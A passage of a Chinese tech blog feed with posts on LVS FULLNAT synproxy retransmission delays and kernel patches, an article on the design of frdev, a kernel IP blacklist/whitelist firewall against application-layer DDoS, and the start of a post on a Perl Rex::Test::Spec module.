1159     [IP_VS_TCP_S_NONE] = 2 * HZ,&lt;br&gt;
1160     [IP_VS_TCP_S_ESTABLISHED] = 90 * HZ,&lt;br&gt;
1161     [IP_VS_TCP_S_SYN_SENT] = 3 * HZ,&lt;br&gt;
1162     [IP_VS_TCP_S_SYN_RECV] = 30 * HZ,&lt;br&gt;
1163     [IP_VS_TCP_S_FIN_WAIT] = 3 * HZ,&lt;br&gt;
1164     [IP_VS_TCP_S_TIME_WAIT] = 3 * HZ,&lt;br&gt;
1165     [IP_VS_TCP_S_CLOSE] = 3 * HZ,&lt;br&gt;
1166     [IP_VS_TCP_S_CLOSE_WAIT] = 3 * HZ,&lt;br&gt;
1167     [IP_VS_TCP_S_LAST_ACK] = 3 * HZ,&lt;br&gt;
1168     [IP_VS_TCP_S_LISTEN] = 2 * 60 * HZ,&lt;br&gt;
1169     [IP_VS_TCP_S_SYNACK] = 30 * HZ,&lt;br&gt;
1170     [IP_VS_TCP_S_LAST] = 2 * HZ,&lt;br&gt;
1171 };&lt;/code&gt;&lt;br&gt;
1161行中的IP_VS_TCP_S_SYN_SENT代表了当fullnat和real server 的第一syn包发送失败以后超时重传的时间,如果synproxy在第二个三次握手时，第一个syn包发送失败或者被丢弃，重发的时间间隔为3s，这就解释了为什么是超时6s,估计是fullnat发送了3次syn包，但是前两次都丢弃了，或者fullnat前两个根本没有发包。从抓包的结果来看，fullnat确实没有发送前2个包，我们进一步在fullnat中打日志查看。在ip_vs_conn.c文件中，对超时的连接有处理：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;881 static void ip_vs_conn_expire(unsigned long data)&lt;br&gt;
 ...&lt;br&gt;
 901     /*&lt;br&gt;
 902      * Retransmit syn packet to rs.&lt;br&gt;
 903      * We just check syn_skb is not NULL, as syn_skb&lt;br&gt;
 904      * is stored only if syn-proxy is enabled.&lt;br&gt;
 905      */&lt;br&gt;
 906     spin_lock(&amp;amp;cp-&amp;gt;lock);&lt;br&gt;
 907     if (cp-&amp;gt;syn_skb != NULL &amp;amp;&amp;amp; atomic_read(&amp;amp;cp-&amp;gt;syn_retry_max) &amp;gt; 0) {&lt;br&gt;
 908         atomic_dec(&amp;amp;cp-&amp;gt;syn_retry_max);&lt;br&gt;
 909         if (cp-&amp;gt;packet_xmit) {&lt;br&gt;
 910             tmp_skb = skb_copy(cp-&amp;gt;syn_skb, GFP_ATOMIC);&lt;br&gt;
 911             cp-&amp;gt;packet_xmit(tmp_skb, cp, pp);&lt;br&gt;
 912         }&lt;br&gt;
 913         /* statistics */&lt;br&gt;
 914         IP_VS_INC_ESTATS(ip_vs_esmib, SYNPROXY_RS_ERROR);&lt;br&gt;
 915         spin_unlock(&amp;amp;cp-&amp;gt;lock);&lt;br&gt;
 916         goto expire_later;&lt;br&gt;
 917     }&lt;br&gt;
 918     spin_unlock(&amp;amp;cp-&amp;gt;lock);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;以上的代码意思就是说，如果重发的次数没有超过最大重发次数（默认是3次），就进行重发。对packet_xmit函数进行了跟踪，发送在超时的时候，packet_xmit函数确实进行了调用，而且调用了成功了，但是抓包却没有抓到。因此估计是在fullnat下面的某个环节，内核把数据包给丢了，具体是在哪里丢的，由于涉及内核东西较多，我暂时还没有追踪。&lt;/p&gt;
&lt;h2&gt;改进方法&lt;/h2&gt;
&lt;p&gt;由于synproxy的第二个三次握手时，没有采用tcp的重传机制，而是采用了简单的3s重传机制，当有丢包时，会出现3s,6s，9s等不等的延迟。消除此现象的方式大概有几种：&lt;br&gt;
1，关掉synproxy，通过测试发现，关掉synproxy的情况会出现某些请求的等待，但出现的概率降低，同时等待的时间大都小于3s&lt;br&gt;
2，改造synproxy的重复机制，使其和tcp的重传机制一样，这也是小米目前采用的方式，修改如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;882 static void ip_vs_conn_expire(unsigned long data)&lt;br&gt;
 883 {&lt;br&gt;
 884     struct ip_vs_conn *cp = (struct ip_vs_conn *)data;&lt;br&gt;
 885     struct sk_buff *tmp_skb = NULL;&lt;br&gt;
 886     struct ip_vs_protocol *pp = ip_vs_proto_get(cp-&amp;gt;protocol);&lt;br&gt;
 887     /* fix synproxy timeout add by panxiaodong@xiaomi.com */&lt;br&gt;
 888     int retry_idx = 0;&lt;br&gt;
 ...&lt;br&gt;
 904     /*&lt;br&gt;
 905      * Retransmit syn packet to rs.&lt;br&gt;
 906      * We just check syn_skb is not NULL, as syn_skb&lt;br&gt;
 907      * is stored only if syn-proxy is enabled.&lt;br&gt;
 908      */&lt;br&gt;
 909     spin_lock(&amp;amp;cp-&amp;gt;lock);&lt;br&gt;
 910     if (cp-&amp;gt;syn_skb != NULL &amp;amp;&amp;amp; atomic_read(&amp;amp;cp-&amp;gt;syn_retry_max) &amp;gt; 0) {&lt;br&gt;
 911         atomic_dec(&amp;amp;cp-&amp;gt;syn_retry_max);&lt;br&gt;
 912         /* fix synproxy timeout add by panxiaodong@xiaomi.com */&lt;br&gt;
 913         retry_idx = sysctl_ip_vs_synproxy_syn_retry - atomic_read(&amp;amp;cp-&amp;gt;syn_retry_max);&lt;br&gt;
 914         cp-&amp;gt;timeout *= (1&amp;lt;&amp;lt;retry_idx);&lt;br&gt;
 915&lt;br&gt;
 916         if (cp-&amp;gt;packet_xmit) {&lt;br&gt;
 917             tmp_skb = skb_copy(cp-&amp;gt;syn_skb, GFP_ATOMIC);&lt;br&gt;
 918             cp-&amp;gt;packet_xmit(tmp_skb, cp, pp);&lt;br&gt;
 919         }&lt;/code&gt;&lt;br&gt;
 从测试效果来看，也能降低延迟等待，但是并不能消除此问题。&lt;br&gt;
 3，修改packet_xmit函数，从追踪的过程中，发现packet_xmit函数已经调用成功，但是包并没有真正发出，估计是内种某个过程丢了，packet_xmit发送宏如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;243 #define IP_VS_XMIT(pf, skb, rt)             \&lt;br&gt;
 244 do {                            \&lt;br&gt;
 245     (skb)-&amp;gt;ipvs_property = 1;           \&lt;br&gt;
 246     skb_forward_csum(skb);              \&lt;br&gt;
 247     NF_HOOK(pf, NF_INET_LOCAL_OUT, (skb), NULL, \&lt;br&gt;
 248         (rt)-&amp;gt;u.dst.dev, dst_output);       \&lt;br&gt;
 249 } while (0)&lt;/code&gt;&lt;br&gt;
 具体为什么会丢包，就不得知了，可以将NF_HOOK接口替换成更底层的发送接口，使用dev_queue_xmit函数可能能解决次问题，synproxy中就使用了此函数，但是我还没有去验证。&lt;/p&gt;
&lt;h2&gt;总结：&lt;/h2&gt;
&lt;p&gt;在fullnat使用过程中，出现顿卡的问题比较影响使用，采用方法二能够降低顿卡现象，但是没有完全解决。或许替换NF_HOOK能完全解决此问题，这个需要与 fullnat的作者[吴佳明等]沟通。测试过程中发现pps越高，顿卡现象越严重，在pps没有超过100w时，基本不会出现顿卡现象。后续会把fullnat在各种环境中的表现，总结一下，再分享出来。&lt;/p&gt;
            
</description>
        <pubDate>Mon, 14 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-14--p=1505-20610a66c.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-14--p=1505-20610a66c.html</guid>
        
        
      </item>
    
      <item>
        <title>DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;在上一篇文章《&lt;a href=&quot;http://www.cnblogs.com/SwordTao/p/3767340.html&quot;&gt;DDoS攻防战 （二） ：CC攻击工具实现与防御理论&lt;/a&gt;》中,笔者阐述了一个防御状态机，它可用来抵御来自应用层的DDoS攻击，但是该状态机依赖一个能应对大量条目快速增删的ip黑白名单防火墙，我们目前并没有发现很好的开源实现以供我们使用。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·实现方案选择：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;硬件实现或者软件实现？&lt;/p&gt;
&lt;p&gt;在面对诸如大量畸形包这样的攻击时，硬件实现将会是非常好的选择，这是因为在进行此类型的封包过滤时，系统需要记忆的状态很少（对于FPGA、ASIC诸多硬件实现方案来讲，记忆元件的成本决不可忽视，寄存器与静态RAM都非常昂贵，所以当需要记忆的信息很少时，纯硬件方案的速度优势使得其完胜软件方案）。&lt;/p&gt;
&lt;p&gt;但是，当状态机需要处理庞大的记忆信息时，我们就需要选择廉价的存储器——动态随机存储器（如SDRAM中的DDR3）来作为系统状态机的存储介质，以降低系统的成本和复杂度。这时，软件实现更胜一筹。尽管纯硬件实现的速度会比软件的方式高出很多，但我们也从第一篇文章《&lt;a href=&quot;http://www.cnblogs.com/SwordTao/p/3766151.html&quot;&gt;DDoS攻防战 （一） ： 概述&lt;/a&gt;》中lvs性能的测试结果中看到，软件实现的、作为服务器前端均衡调度器的lvs，性能理想并且能胜任实际生产环境中的、庞大的用户请求处理，可见，如果设计合理，软件实现的性能无需过多担忧。&lt;/p&gt;
&lt;p&gt;最终，我们决定采用软件的方法来实现所需的ip黑白名单模块。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·最终系统鸟瞰：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;笔者花费大约二十天的时间，使用C语言实现了这一模块，其中，内核空间的核心代码约2300行，用户空间管理工具的代码总行数约为700行。下为系统的鸟瞰：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/219e6104bd9573cda6d5eb910c9aaa61.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72936&quot; alt=&quot;041927426214190&quot; src=&quot;/images/jobbole.com/d915a7fa71ecd91a5cebf8da673480c5.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt; ·用户空间管理工具fripadm，通过ioctl与工作于内核态的frdev模块进行通信&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  ·frdev维护两个double_hash_table的实例，并提供了一个挂在NF_INET_PRE_ROUTING的钩子函数，其通过操作这两个double_hash_table的实例以分别实现ip黑名单、白名单的功能&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  ·frdev通过内核中设备驱动的ioctl机制，向用户空间提供这两个double_hash_table实例的操作函数，而我们的用户空间管理工具fripadm正是基于此而实现的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面是内核态的主要数据结构与其对应的操作函数：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/69d337ddf8c78477c9a0ef2631d4abe5.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72937&quot; alt=&quot;041909364491925&quot; src=&quot;/images/jobbole.com/e3211d3f289593cc143e4b3b0f9d5c27.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;struct fr_ip_hash_array的功能：
  精确ip查询；
  模糊ip查询；
  自定义hash表的长度；
  自定义hash function，其输入散列随机数为rnd；
  维护精确ip的哈希表；
  维护模糊ip的链表；
  维护精确ip与模糊ip的诸统计信息；

ip字符描述语法：
  /* ips_syntax : RE 
  digit  =: [0-9]
  num    =: (digit){1,3}
  atom   =: num | (num&#39;-&#39;num) | &#39;*&#39;
  ip     =: atom &#39;.&#39; atom &#39;.&#39; atom &#39;.&#39; atom 
  ips    =: (ip &#39; &#39;)+
  */
  // ret 0 success,otherwise syntax error
  // &quot;1-220.*.100.33 1-220.*.100.33 1-220.*.100.33&quot;

struct fr_ip_hash_array的方法：
  fr_ip_hash_array_malloc / fr_ip_hash_array_destroy
  fr_ip_hash_array_insert_ip  ：增加一条精确ip记录
  fr_ip_hash_array_insert_blurip_ptr  ：增加一条模糊ip记录（以指针引用的方式）
  fr_ip_hash_array_delete_ip
  fr_ip_hash_array_delete_blurip_ptr
  fr_ip_hash_array_delete_ip_randomly  ：随机地删除指定数量的精确ip
  fr_ip_hash_array_insert_ip_bystrings  ：通过字符串的表述方式，向fr_ip_hash_array增加精确ip或者模糊ip
  fr_ip_hash_array_delete_ip_bystrings
  fr_ip_hash_array_find_bool  ：查找给定的ip是否在已存储的模糊ip范围之内或者精确ip的哈希表之中
  fr_ip_hash_array_find_ip_bool  ：查找给定的ip是否在精确ip的哈希表之中
  fr_ip_hash_array_find_ip_bystrings_bool&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;·为什么使用双哈希表缓冲？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;请考虑如下场景：&lt;/p&gt;
&lt;p&gt;情况1：来自应用层的DDoS攻击常常是瞬间涌入大量非法ip请求，例如数万个非法ip，所以，对于防火墙黑白名单功能的要求至少有如下：能在很短的时间内更新大量数据项，且不能造成系统服务停顿。&lt;/p&gt;
&lt;p&gt;分析：如果只使用一个全局的哈希表，当在短时间内进行大量的数据项增删时，例如，成千上万个，此时，即使采用多把读写锁分割哈希表的策略，对共享资源的竞争也依然将严重影响系统响应速度，严重时系统可能会停顿或者更糟，对于生产环境中的高负载服务器，这是无法容忍的。&lt;/p&gt;
&lt;p&gt;解决：以空间换时间&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/aa638936ce768f48f83884904359bbbd.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72938&quot; alt=&quot;041910359024155&quot; src=&quot;/images/jobbole.com/f79cd374f6285d556d21facd945d2de2.jpg&quot;&gt;&lt;/a&gt;\&lt;/p&gt;
&lt;p&gt;采用双哈希表缓冲的策略，将系统共享资源的竞争热点压缩至两个hash表指针主备切换的极短时间内，此方法能显著降低系统在大量数据项更新时共享资源的竞争。&lt;/p&gt;
&lt;p&gt;系统查询将会直接访问master指向的fr_ip_hash_array，而用户的更新操作将直接针对mirror所指向的另一个fr_ip_hash_array实例，直到switch_mirror_update操作的执行，master将被瞬间“更新”。这是其主要的工作特点。&lt;/p&gt;
&lt;p&gt;对于SMP与多队列网卡的系统，可采用如下策略：多数cpu核心专门负责处理内核的softirq任务，剩下的少数cpu负责进行双哈希表的更新、切换与重建等操作。这样可提高系统对攻击的快速防御响应。&lt;/p&gt;
&lt;p&gt;但此方案将使得系统需要维护两个互为镜像的哈希表，这将加重系统内存的读写负担。&lt;/p&gt;
&lt;p&gt;具体实现细节如下：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;struct fr_ip_double_hash的成员：
  struct fr_ip_hash_array * master_ptr;
  rwlock_t master_lock;  
  struct fr_ip_hash_array * mirror_ptr;
  rwlock_t mirror_lock;

struct fr_ip_double_hash的方法：
  fr_ip_double_hash_malloc / fr_ip_double_hash_destroy
  fr_ip_double_hash_mirror_insert_ip ：只针对mirror的insert ip操作
  fr_ip_double_hash_mirror_insert_blurip_ptr
  fr_ip_double_hash_mirror_insert_bystrings
  fr_ip_double_hash_mirror_delete_ip
  fr_ip_double_hash_mirror_delete_blurip_ptr
  fr_ip_double_hash_mirror_delete_bystrings
  fr_ip_double_hash_mirror_delete_ip_randomly
  fr_ip_double_hash_mirror_delete_all ：删除mirror中所有的ip记录，即所有的精确ip和模糊ip记录
  fr_ip_double_hash_switch_mirror_update ：将mirror与master互换，并更新master至mirror（此时的mirror即为之前的master）
  fr_ip_double_hash_rebuild ：将双哈希表重建，可指定新的hash function、rnd以及hash表的长度，这将解决hash表查询效率低下的问题，以防御外界针对hash表的攻击。当然，在重建之后，原有的诸多ip条目不会丢失。
  fr_ip_double_hash_find_bool
  fr_ip_double_hash_find_bystrings_bool&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;挂到协议栈上的钩子函数：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在模块初始化函数fr_ip_dev_init的最后，即当两个双哈希表实例（分别用作黑名单与白名单）初始化成功、fedev设备注册成功之后，其将会执行nf_register_hook，将指定的钩子函数fr_nf_hook_sample挂到NF_INET_PRE_ROUTING之上。&lt;/p&gt;
&lt;p&gt;fr_nf_hook_sample的主要处理代码如下：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;if(fr_ip_double_hash_find_bool(double_hash_white_ptr,sip)) 
　　  return NF_ACCEPT;
   else if(fr_ip_double_hash_find_bool(double_hash_ptr,sip)) 
　　  return NF_DROP;
   else  
　　  return NF_ACCEPT;&lt;/pre&gt;
&lt;p&gt;其中，double_hash_white_ptr指向白名单fr_ip_double_hash实例，double_hash_ptr则指向黑名单fr_ip_double_hash实例，由于支持模糊ip匹配，故，上述代码使得对源ip过滤的“通”、“堵”策略皆可使用。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内核空间frdev的ioctl处理函数：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前，ioctl支持来自用户空间的如下操作：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;//黑名单操作
/* in-black ip */
#define FR_IP_IOCTL_TYPE_FIND    1
#define FR_IP_IOCTL_TYPE_FIND_BYSTRINGS        2    // *   输入ip字符查找
#define FR_IP_IOCTL_TYPE_MIRROR_INSERT_IP    3    
#define FR_IP_IOCTL_TYPE_MIRROR_INSERT_BYSTRINGS    4    // * 
#define FR_IP_IOCTL_TYPE_MIRROR_DELETE_IP    5        // *  
#define FR_IP_IOCTL_TYPE_MIRROR_DELETE_IP_RANDOMLY        6 //*  
#define FR_IP_IOCTL_TYPE_MIRROR_DELETE_BYSTRINGS    7    // * 
#define FR_IP_IOCTL_TYPE_MIRROR_DELETE_ALL        8    //*  
#define FR_IP_IOCTL_TYPE_SWITCH_MIRROR_UPDATE    9    // *  
#define FR_IP_IOCTL_TYPE_REBUILD    10    // *    
#define FR_IP_IOCTL_TYPE_COPY_HASH_STRUCT     11    // *
#define FR_IP_IOCTL_TYPE_DUMP    12    //*    输出双哈希表的分布情况与统计信息
#define FR_IP_IOCTL_TYPE_MIRROR_INSERT_IP_BINS    13    //*   一次增加大量精确ip，以二进制的方式输入
#define FR_IP_IOCTL_TYPE_MIRROR_DELETE_IP_BINS    14    //*  

//白名单操作
/* in-white ip */
#define FR_IP_IOCTL_TYPE_WHITE_FIND    101
#define FR_IP_IOCTL_TYPE_WHITE_FIND_BYSTRINGS        102  // * 
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_INSERT_IP        103
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_INSERT_BYSTRINGS    104  // * 
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_DELETE_IP        105
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_DELETE_IP_RANDOMLY        106  // * 
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_DELETE_BYSTRINGS    107    // * 
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_DELETE_ALL        108    //*  
#define FR_IP_IOCTL_TYPE_WHITE_SWITCH_MIRROR_UPDATE    109    // *  
#define FR_IP_IOCTL_TYPE_WHITE_REBUILD    110    // *    
#define FR_IP_IOCTL_TYPE_WHITE_COPY_HASH_STRUCT     111    // *
#define FR_IP_IOCTL_TYPE_WHITE_DUMP    112    //*  
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_INSERT_IP_BINS    113    //*  
#define FR_IP_IOCTL_TYPE_WHITE_MIRROR_DELETE_IP_BINS    114    //*&lt;/pre&gt;
&lt;p&gt;上述各功能的具体实现请阅读frdev源码中的fr_ip_dev_ioctl_routine函数。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用户空间管理工具：fripadm&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一步，实现fripadm_black_in_exe与fripadm_white_in_exe，是分别管理黑白名单的工具，不过，较为简陋，第二步，使用shell脚本对其进行二次封装得到fripadm_black_in.sh与fripadm_white_in.sh这两个较用户友好的工具。&lt;/p&gt;
&lt;p&gt;fripadm为用户空间的C语言开发者们提供了如下API：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;//针对ip黑名单的操作
double_hash_find_bystrings(int fd,char * str, unsigned int size) //其中fd为frdev的fd——文件描述符
double_hash_mirror_insert_bystrings(int fd,char * str, unsigned int size)
double_hash_mirror_insert_bins(int fd,char * str, unsigned int size)
double_hash_mirror_delete_bystrings(int fd,char * str, unsigned int size)
double_hash_mirror_delete_bins(int fd,char * str, unsigned int size)
double_hash_mirror_delete_ip_randomly(int fd,unsigned int size)
double_hash_mirror_delete_all(int fd)
double_hash_switch_mirror_update(int fd)
double_hash_rebuild(int fd,unsigned int modular, unsigned int rnd)
double_hash_dump(int fd)
//针对ip白名单的操作
double_hash_white_find_bystrings(int fd,char * str, unsigned int size) //其中fd为frdev的fd——文件描述符
double_hash_white_mirror_insert_bystrings(int fd,char * str, unsigned int size)
double_hash_white_mirror_insert_bins(int fd,char * str, unsigned int size)
double_hash_white_mirror_delete_bystrings(int fd,char * str, unsigned int size)
double_hash_white_mirror_delete_bins(int fd,char * str, unsigned int size)
double_hash_white_mirror_delete_ip_randomly(int fd,unsigned int size)
double_hash_white_mirror_delete_all(int fd)
double_hash_white_switch_mirror_update(int fd)
double_hash_white_rebuild(int fd,unsigned int modular, unsigned int rnd)
double_hash_white_dump(int fd)&lt;/pre&gt;
&lt;p&gt;fripadm_black_in_exe、fripadm_white_in_exe、fripadm_black_in.sh与 fripadm_white_in.sh的具体实现请参看frdev源码。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最终系统测试：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/bafa2a3553cf40af65c32be09b6c8040.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72941&quot; alt=&quot;041917316374465&quot; src=&quot;/images/jobbole.com/52518f6f7cce3e0a2992190919f677ee.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;按照README所述的过程，编译、安装完毕frdev设备后，便可进行如下测试：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/40040dcaf4798222c23a7968d024dc7c.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72942&quot; alt=&quot;041937462625839&quot; src=&quot;/images/jobbole.com/36e7cb5791c8b6c9f82f89ceb2208ce5.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/00279c2d6d4bcc2583f4241519db59b6.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72943&quot; alt=&quot;041938024021637&quot; src=&quot;/images/jobbole.com/7bf0bc150b5c97bdf03e17393db621c2.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原本被black所DROP的数据包，在更新了white的ip条目后，被white所ACCEPT，上图红线标出了数据包被截断的icmp_seq的区间。  &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关于frdev的陈述到此为止。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最近笔者在阅读《白帽子讲Web安全》这本书时，发现了雅虎公司用于防护应用层DDoS攻击的系统Yahoo Detecting System Abuse，yahoo为此系统申请了专利保护。下面是关于这个系统的描述： &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; （Patent N0.: US 7,533,414 B1 &lt;/strong&gt;&lt;strong&gt;资料来源 &lt;a href=&quot;http://patentimages.storage.googleapis.com/pdfs/US7533414.pdf&quot;&gt;http://patentimages.storage.googleapis.com/pdfs/US7533414.pdf&lt;/a&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;  A system continually monitors service requests and detects service abuses.&lt;/p&gt;
&lt;p&gt;First, a screening list is created to identify potential abuse events. A screening list includes event IDs and associated count values. A pointer cyclically selects entries in the table,advancing as events are received.&lt;/p&gt;
&lt;p&gt;An incoming event ID is compared with the event IDs in the table. If the incoming event ID matches an event ID in the Screening list,the associated count is incremented. Otherwise, the count of a selected table entry is decremented. If the count value of the selected entry falls to Zero, it is replaced With the incoming event.&lt;/p&gt;
&lt;p&gt;Event IDs can be based on properties of service users,such as user identifications, or of service request contents,such as a search term or message content. The screening list is analyzed to determine whether actual abuse is occurring.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;大概思路如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/372862ce489bd277c6d3da768af24458.png&quot; rel=&quot;lightbox[72935]&quot; title=&quot;DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72944&quot; alt=&quot;041922262301198&quot; src=&quot;/images/jobbole.com/9e54da35f3d34a2aa8783d1477be9ad1.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;此系统通过维护一个筛选表来得到用户的请求频率，以判断其是否存在service abuse，然采取相关措施，例如BLOCK。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  这种防御思想，与我们之前所提出的防御状态机有着异曲同工之妙。笔者认为这是必然的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;前面的文章已经提过，DDoS攻击存在的主要原因之一是网络服务的开放性，我们不可能从下层来解决这样的问题（因为服务的可用性是第一要求），只能从上层分析解决.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  而应用层已经处于协议栈的最高层，所以，要防御应用层DDoS攻击，只能从应用层以上来寻找解法，故，在这种情况下，除了借助数据统计分析，难道还会有更好的方法么？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实现frdev的过程中，借助互联网解决了很多问题，所以，&lt;strong&gt;如果您需要frdev的源码，请在下方留下邮箱 :)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果有小伙伴想要一起来增强&lt;/strong&gt;&lt;strong&gt;frdev的功能，热烈欢迎 :)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通讯邮箱：&lt;a href=&quot;mailto:yunthanatos@163.com&quot;&gt;yunthanatos@163.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Thu, 10 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-10-72935-d195773f0.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-10-72935-d195773f0.html</guid>
        
        
      </item>
    
      <item>
        <title>Rex::Test::Spec 模块</title>
        <description>  &lt;div style=&quot;background-color: #FFF;&quot;&gt;
    &lt;p&gt;上篇说了 serverspec 工具，我一直对 Rspec 的语法蛮有好感的，于是昨晚花了点时间模仿这个给 Rex 写了个类似的工具，叫 Rex::Test::Spec，源代码地址见：&lt;a href=&quot;https://github.com/chenryn/Rex--Test--Spec&quot;&gt;https://github.com/chenryn/Rex--Test--Spec&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;语法大概是这样的：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Rex::Test::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Spec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
